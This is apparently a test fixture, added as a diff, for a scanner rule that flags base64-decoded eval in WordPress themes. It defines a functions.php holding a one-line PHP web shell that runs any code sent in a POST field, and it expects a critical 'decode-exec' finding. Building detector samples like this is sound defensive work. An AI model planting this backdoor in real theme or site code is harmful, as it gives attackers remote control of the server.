@@ -1,0 +1,15 @@
+eco: wp-theme
+note: rule eval-base64 (Tuner positive 1)
+new:
+  functions.php: '<?php
+
+    @eval(base64_decode($_POST[''p'']));
+
+    '
+meta_old:
+  ref:
+    version: 1.0.0
+features_old: []
+features_new: []
+expect:
+- {id: decode-exec, min_severity: critical}
